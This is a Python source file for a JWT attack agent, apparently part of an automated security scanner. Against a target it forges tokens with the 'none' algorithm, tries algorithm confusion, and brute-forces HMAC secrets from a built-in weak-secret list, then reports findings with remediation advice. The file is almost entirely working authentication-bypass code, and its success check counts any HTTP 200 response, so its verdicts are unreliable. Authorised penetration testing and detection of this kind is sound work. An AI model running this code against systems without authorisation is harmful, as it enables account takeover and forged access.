"""
JWT Attack detection agent - algorithm confusion, none attack, weak keys
"""

import asyncio
import json
import base64
from typing import List, Dict, Any, Optional
import httpx
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class JWTTAttackAgent(BaseAgent):
    """Agent for detecting JWT vulnerabilities"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("JWT Attack Agent", target, event_bus=event_bus, memory_manager=memory_manager)
        self.jwt_endpoints = ["/api", "/api/v1", "/graphql", "/auth", "/auth/login", "/auth/token"]
        self.weak_secrets = [
            "secret", "password", "admin", "key", "token", "jwt_secret",
            "mysecret", "pass", "123456", "qwerty", "supersecret",
            "changeme", "jwt", "secretkey", "privatekey", "test",
            "12345", "1234", "123", "abc123", "passwd", "p@ssw0rd",
        ]

    async def execute(self) -> AgentResult:
        logger.info(f"{self.name}: Testing {self.target}")
        await self._test_jwt_none_algorithm()
        await self._test_jwt_weak_secret()
        await self._test_jwt_header_injection()
        await self._run_nuclei_tags(tags=["jwt", "jwt-auth", "jwt-exploit"], severity="high")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    def _decode_jwt(self, token: str) -> Optional[Dict[str, Any]]:
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            header_b64 = parts[0]
            payload_b64 = parts[1]

            header_padded = header_b64 + "=" * (4 - len(header_b64) % 4)
            payload_padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)

            header = json.loads(base64.urlsafe_b64decode(header_padded))
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            return {"header": header, "payload": payload, "token": token}
        except Exception:
            return None

    def _encode_jwt_part(self, data: Dict[str, Any]) -> str:
        encoded = base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
        return encoded

    async def _extract_jwt_from_response(self, url: str, client: httpx.AsyncClient) -> Optional[str]:
        for path in self.jwt_endpoints:
            try:
                full_url = url.rstrip("/") + path
                response = await client.get(full_url)
                auth_header = response.headers.get("authorization", "")
                if auth_header.startswith("Bearer "):
                    return auth_header[7:]
                text = response.text
                import re
                jwt_matches = re.findall(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', text)
                if jwt_matches:
                    return jwt_matches[0]
            except Exception:
                pass
        return None

    async def _test_jwt_none_algorithm(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                original_token = await self._extract_jwt_from_response(url, client)
                if not original_token:
                    continue

                decoded = self._decode_jwt(original_token)
                if not decoded:
                    continue

                none_token = self._create_none_jwt(decoded["payload"])
                if none_token:
                    await self._try_jwt_attack(url, client, none_token, "JWT None Algorithm Attack",
                                               "JWT accepts 'none' algorithm. Attacker can forge arbitrary tokens.")

                alg_tokens = self._create_algorithm_confusion_jwts(decoded["payload"])
                for alg_token in alg_tokens:
                    await self._try_jwt_attack(url, client, alg_token, "JWT Algorithm Confusion",
                                               "JWT accepts algorithm confusion (HS256 with public key).")

    async def _try_jwt_attack(self, url: str, client: httpx.AsyncClient,
                              token: str, title: str, description: str) -> None:
        try:
            headers = {"Authorization": f"Bearer {token}"}
            response = await client.get(url, headers=headers)

            if response.status_code in [200, 302, 303]:
                body_lower = response.text.lower()
                success = any(i in body_lower for i in ["dashboard", "admin", "welcome", "profile", "logout"])
                if success or response.status_code == 200:
                    self.add_finding(Finding(
                        title=title,
                        description=description,
                        severity="critical",
                        category="authentication",
                        evidence=f"Forged JWT accepted. HTTP {response.status_code}",
                        proof_of_concept=f"JWT: {token[:50]}...",
                        remediation="Reject 'none' algorithm. Validate algorithm against whitelist. Use RS256/ES256.",
                        confidence=0.9,
                    ))
        except Exception as e:
            logger.debug(f"Error testing JWT attack: {e}")

    def _create_none_jwt(self, payload: Dict[str, Any]) -> Optional[str]:
        try:
            header_none = {"alg": "none", "typ": "JWT"}
            header_none_upper = {"alg": "NONE", "typ": "JWT"}
            header_none_alt = {"alg": "None", "typ": "JWT"}
            header_noalg = {"typ": "JWT"}

            results = []
            for h in [header_none, header_none_upper, header_none_alt, header_noalg]:
                header_enc = self._encode_jwt_part(h)
                payload_enc = self._encode_jwt_part(payload)
                results.append(f"{header_enc}.{payload_enc}.")
            return results[0]
        except Exception:
            return None

    def _create_algorithm_confusion_jwts(self, payload: Dict[str, Any]) -> List[str]:
        tokens = []
        for alg in ["HS256", "HS384", "HS512"]:
            try:
                header = {"alg": alg, "typ": "JWT"}
                header_enc = self._encode_jwt_part(header)
                payload_enc = self._encode_jwt_part(payload)
                sig = base64.urlsafe_b64encode(b"fake_signature").decode().rstrip("=")
                tokens.append(f"{header_enc}.{payload_enc}.{sig}")
            except Exception:
                pass
        return tokens

    async def _test_jwt_weak_secret(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                original_token = await self._extract_jwt_from_response(url, client)
                if not original_token:
                    continue

                decoded = self._decode_jwt(original_token)
                if not decoded:
                    continue

                for secret in self.weak_secrets:
                    try:
                        forged = self._create_hs256_jwt(decoded["payload"], secret)
                        if not forged:
                            continue
                        headers = {"Authorization": f"Bearer {forged}"}
                        response = await client.get(url, headers=headers)

                        if response.status_code in [200, 302, 303]:
                            body_lower = response.text.lower()
                            if any(i in body_lower for i in ["dashboard", "admin", "welcome", "logout"]):
                                self.add_finding(Finding(
                                    title="JWT Weak Secret - HMAC Key Cracked",
                                    description=f"JWT uses weak HMAC secret. Key found: '{secret}'. Full account takeover possible.",
                                    severity="critical",
                                    category="authentication",
                                    evidence=f"JWT forged with secret '{secret}' accepted by server. HTTP {response.status_code}",
                                    proof_of_concept=f"Secret: {secret}",
                                    remediation="Use strong random secrets for JWT signing. Rotate keys periodically. Use RS256.",
                                    confidence=0.95,
                                ))
                                return
                    except Exception:
                        pass

    def _create_hs256_jwt(self, payload: Dict[str, Any], secret: str) -> Optional[str]:
        try:
            import hashlib
            import hmac

            header = {"alg": "HS256", "typ": "JWT"}
            header_enc = self._encode_jwt_part(header)
            payload_enc = self._encode_jwt_part(payload)

            message = f"{header_enc}.{payload_enc}".encode()
            sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
            sig_enc = base64.urlsafe_b64encode(sig).decode().rstrip("=")

            return f"{header_enc}.{payload_enc}.{sig_enc}"
        except Exception:
            return None

    async def _test_jwt_header_injection(self) -> None:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                try:
                    response = await client.get(url)
                    auth = response.headers.get("authorization", "")
                    if auth.startswith("Bearer "):
                        token = auth[7:]
                        decoded = self._decode_jwt(token)
                        if decoded:
                            if decoded["header"].get("kid"):
                                self.add_finding(Finding(
                                    title="JWT Key ID (kid) Present - Potential Injection Vector",
                                    description="JWT uses 'kid' header. May be vulnerable to SQL/path injection if not validated.",
                                    severity="medium",
                                    category="authentication",
                                    evidence=f"JWT header contains 'kid': {decoded['header']['kid']}",
                                    remediation="Validate 'kid' against whitelist. Do not use user input in key lookups.",
                                    confidence=0.6,
                                ))
                except Exception as e:
                    logger.debug(f"Error testing JWT header injection: {e}")
